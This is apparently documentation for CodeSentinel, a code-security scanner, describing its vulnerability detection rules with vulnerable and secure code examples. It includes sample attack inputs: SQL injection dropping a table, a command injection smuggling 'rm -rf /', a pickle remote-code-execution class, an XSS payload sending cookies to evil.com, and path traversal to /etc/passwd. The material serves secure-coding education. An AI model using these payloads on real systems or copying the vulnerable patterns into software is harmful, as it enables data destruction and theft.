# CodeSentinel - AI代码安全卫士

## 🔒 漏洞检测规则详解

本文档详细说明了CodeSentinel使用的漏洞检测规则。

---

## 🔴 严重漏洞 (CVSS 9-10)

### 1. SQL注入 (CVSS: 9.8)

#### 检测模式

**风险代码特征**：
```python
# Python - 字符串拼接
query = f"SELECT * FROM users WHERE id = {user_id}"
cursor.execute(query)

# Python - %格式化
query = "SELECT * FROM users WHERE id = %s" % user_id
cursor.execute(query)

# Python - format方法
query = "SELECT * FROM users WHERE id = {}".format(user_id)
cursor.execute(query)

# JavaScript - 字符串拼接
const query = `SELECT * FROM users WHERE id = ${userId}`;
```

**安全代码模式**：
```python
# Python - 参数化查询
query = "SELECT * FROM users WHERE id = ?"
cursor.execute(query, (user_id,))

# Python - ORM
result = User.query.filter_by(id=user_id).first()

# JavaScript - 参数化查询
const query = 'SELECT * FROM users WHERE id = ?';
connection.execute(query, [userId]);
```

#### 攻击示例

```python
# 恶意输入
user_id = "1; DROP TABLE users; --"
# 实际执行: SELECT * FROM users WHERE id = 1; DROP TABLE users; --
```

---

### 2. 命令注入 (CVSS: 9.1)

#### 检测模式

**风险代码特征**：
```python
import os
import subprocess

# 危险 - shell=True允许命令注入
os.system(f"echo {user_input}")
subprocess.call(user_input, shell=True)

# 危险 - eval/exec执行任意代码
eval(user_input)
exec(user_code)

# 危险 - 使用用户输入的命令
os.popen(user_command)
```

**安全代码模式**：
```python
import subprocess

# 安全 - 禁用shell
subprocess.run(['echo', user_input], capture_output=True)

# 安全 - 白名单验证
ALLOWED_COMMANDS = ['status', 'info']
if command in ALLOWED_COMMANDS:
    subprocess.run([command])
```

#### 攻击示例

```python
# 恶意输入
user_input = "; rm -rf /; echo "
# 实际执行: echo ; rm -rf /; echo
```

---

### 3. 硬编码凭证 (CVSS: 8.5)

#### 检测模式

**风险代码特征**：
```python
# API密钥
API_KEY = "sk-live-abc123xyz789"
OPENAI_API_KEY = "sk-1234567890"

# 密码
DB_PASSWORD = "my_secret_password"
ADMIN_PASS = "admin123"

# Token
JWT_SECRET = "your-secret-key"
BEARER_TOKEN = "ghp_xxxxx"
```

**安全代码模式**：
```python
import os
from dotenv import load_dotenv

load_dotenv()  # 从.env文件加载

API_KEY = os.environ.get('API_KEY')

# 或使用密钥管理服务
from keyring import get_password
API_KEY = get_password('myapp', 'api_key')
```

---

### 4. 不安全反序列化 (CVSS: 8.1)

#### 检测模式

**风险代码特征**：
```python
import pickle
import yaml
import jsonpickle

# 危险 - pickle可以执行任意代码
data = pickle.loads(untrusted_data)

# 危险 - yaml不安全加载
obj = yaml.load(untrusted_yaml)

# 危险 - jsonpickle
obj = jsonpickle.decode(untrusted_json)
```

**安全代码模式**：
```python
import json
import hmac

# 安全 - 使用JSON
data = json.loads(untrusted_data)

# 安全 - 签名验证后才反序列化
def safe_unpickle(data, signature, secret):
    expected = hmac.new(secret, data, 'sha256').hexdigest()
    if not hmac.compare_digest(signature, expected):
        raise ValueError("Invalid signature")
    return pickle.loads(data)
```

#### 攻击示例

```python
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('whoami',))

# 序列化后可以执行任意命令
malicious_data = pickle.dumps(RCE())
pickle.loads(malicious_data)  # 执行whoami命令
```

---

## 🟠 高危漏洞 (CVSS 7-8.9)

### 5. XSS跨站脚本 (CVSS: 8.1)

#### 检测模式

**风险代码特征**：
```javascript
// JavaScript/HTML
element.innerHTML = userInput;
document.write(userInput);

// React
<div dangerouslySetInnerHTML={{__html: userInput}} />

// Vue
<div v-html="userInput"></div>
```

**安全代码模式**：
```javascript
// 安全 - 使用textContent
element.textContent = userInput;

// 安全 - HTML转义
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);
```

#### 攻击示例

```javascript
// 恶意输入
userInput = '<script>document.location="https://evil.com/?c="+document.cookie</script>';
```

---

### 6. 路径遍历 (CVSS: 7.5)

#### 检测模式

**风险代码特征**：
```python
# 危险 - 直接拼接路径
file_path = "/data/" + filename
with open(file_path) as f:
    content = f.read()

# 危险 - 缺少验证的路径拼接
user_file = request.args.get('file')
with open(f"/app/uploads/{user_file}") as f:
    return f.read()
```

**安全代码模式**：
```python
from pathlib import Path

def safe_read_file(filename, base_dir="/data"):
    base = Path(base_dir).resolve()
    requested = (base / filename).resolve()
    
    # 确保路径在允许的目录内
    if not requested.is_relative_to(base):
        raise ValueError("Access denied")
    
    return requested.read_text()
```

#### 攻击示例

```python
# 恶意输入
filename = "../../../etc/passwd"
# 实际读取: /data/../../../etc/passwd -> /etc/passwd
```

---

## 🟡 中危漏洞 (CVSS 4-6.9)

### 7. 弱密码哈希 (CVSS: 5.3)

#### 检测模式

**风险代码特征**：
```python
import hashlib

# 危险 - MD5用于密码
hashed = hashlib.md5(password.encode()).hexdigest()

# 危险 - SHA1用于密码
hashed = hashlib.sha1(password.encode()).hexdigest()

# 危险 - 不加盐
hashed = hashlib.sha256(password.encode()).hexdigest()
```

**安全代码模式**：
```python
import bcrypt
import argon2

# 推荐 - bcrypt
salt = bcrypt.gensalt()
hashed = bcrypt.hashpw(password.encode(), salt)
if bcrypt.checkpw(password.encode(), hashed):
    # 验证成功
    pass

# 推荐 - argon2 (更安全)
hasher = argon2.PasswordHasher()
hashed = hasher.hash(password)
hasher.verify(hashed, password)
```

---

### 8. 敏感信息泄露 (CVSS: 4.2)

#### 检测模式

**风险代码特征**：
```python
# 危险 - 打印敏感信息
print(f"Login: {username}, Password: {password}")

# 危险 - 日志记录敏感信息
logging.info(f"API Key: {api_key}")
logging.info(f"Token: {token}")

# 危险 - 错误信息泄露
return {"error": f"Database password is: {db_password}"}
```

**安全代码模式**：
```python
import logging

# 安全 - 结构化日志，不打印敏感值
logging.info("Login attempt", extra={
    "username": username,
    "event": "login"
})

# 安全 - 只记录事件，不记录数据
logger.info("Password reset requested", extra={
    "user_id": user_id
})
```

---

## 🟢 低危漏洞 (CVSS 0-3.9)

### 9. CORS配置错误

#### 检测模式

**风险代码特征**：
```python
# 危险 - 允许所有来源
@app.route('/api/data')
def get_data():
    response.headers['Access-Control-Allow-Origin'] = '*'
    return jsonify(data)

# 危险 - 允许凭据与通配符
response.headers['Access-Control-Allow-Origin'] = '*'
response.headers['Access-Control-Allow-Credentials'] = 'true'
```

**安全代码模式**：
```python
# 安全 - 白名单配置
ALLOWED_ORIGINS = ['https://example.com', 'https://app.example.com']

@app.route('/api/data')
def get_data():
    origin = request.headers.get('Origin')
    if origin in ALLOWED_ORIGINS:
        response.headers['Access-Control-Allow-Origin'] = origin
    return jsonify(data)
```

---

## 📊 CVSS评分参考

| 评分范围 | 严重程度 | 颜色标识 |
|---------|---------|---------|
| 9.0-10.0 | 严重 | 🔴 |
| 7.0-8.9 | 高危 | 🟠 |
| 4.0-6.9 | 中危 | 🟡 |
| 0.1-3.9 | 低危 | 🟢 |

---

## 🔧 自定义规则

### 跳过扫描

```python
# sentinel:scan=False
# 这段代码将被跳过扫描
```

### 指定严重程度

```python
# sentinel:severity=high
# 只报告高危及以上漏洞
```

### 禁用特定规则

```python
# sentinel:rules=-sql_injection
# 禁用SQL注入检测
```

---

*本文档由 CodeSentinel 团队维护*
